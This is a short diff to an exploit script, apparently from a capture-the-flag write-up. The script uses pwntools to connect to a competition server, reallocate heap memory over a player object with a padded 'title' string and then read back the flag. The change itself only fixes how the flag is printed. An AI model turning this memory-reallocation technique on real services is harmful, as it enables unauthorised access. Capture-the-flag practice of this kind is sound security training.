@@ -735,7 +735,7 @@ with remote("quals.shadow-league.org", 5001) as p:
     p.sendline("title " + "A" * 23) # Re allocate memory on top of player
     p.sendline("login")             # Drop the flag.
     p.readuntil("SCE{")
-    flag = p.readline()
+    flag = "SCE{" + p.readline()
     
-log.info("Found the flag: SCE{{{}".format(flag))
+log.info("Found the flag: {}".format(flag))
 ```
